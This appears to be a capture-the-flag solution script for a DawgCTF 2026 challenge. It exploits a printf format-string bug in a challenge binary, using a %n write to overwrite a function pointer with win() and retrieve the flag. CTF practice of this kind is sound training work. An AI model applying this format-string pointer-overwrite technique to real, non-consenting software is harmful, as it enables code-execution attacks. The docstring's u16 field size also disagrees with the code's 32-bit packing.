#!/usr/bin/env python3
"""
Stacking Melodies - DawgCTF 2026
Format string vuln: printf(title) with controlled title from binary stream.
Overwrite ctx->server_logging function pointer with win() via %n.

Vuln chain:
  1. Binary stream format: magic(0x564d576e) + t_len(u16) + d_len(u32) + title + data
  2. printf(title) — format string vuln, title controlled via fread
  3. arg9 on stack = ctx pointer → %9$n writes to ctx->server_logging
  4. ctx->server_logging("Rating", rating) calls our overwritten pointer → win()

Remote win() at 0x40124e (differs from local 0x401234 due to different GCC).
"""
from pwn import *
import struct, sys

HOST = "nc.umbccd.net"
PORT = 8929

context.arch = 'amd64'

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process("./files/stacking_melodies")

MAGIC = 0x564d576e
WIN_LOCAL = 0x401234
WIN_REMOTE = 0x40124e

WIN = WIN_REMOTE if args.REMOTE else WIN_LOCAL

# Format string: %{WIN}c pads first arg to WIN chars, %9$n writes char count to *arg9
# arg9 = ctx pointer on stack → writes WIN to ctx->server_logging (fn ptr)
title = f'%{WIN}c%9$n'.encode()
t_len = len(title)
d_len = 8

header = struct.pack('<III', MAGIC, t_len, d_len)
data = b'A' * d_len

io = get_process()
io.send(header + title + data)

# Skip ~4MB of space-padding from %Xc, then read flag
out = io.recvall(timeout=15)
stripped = out.replace(b' ', b'').strip()
lines = [l for l in stripped.split(b'\n') if l.strip()]
for l in lines:
    print(l.decode(errors='replace'))

io.close()
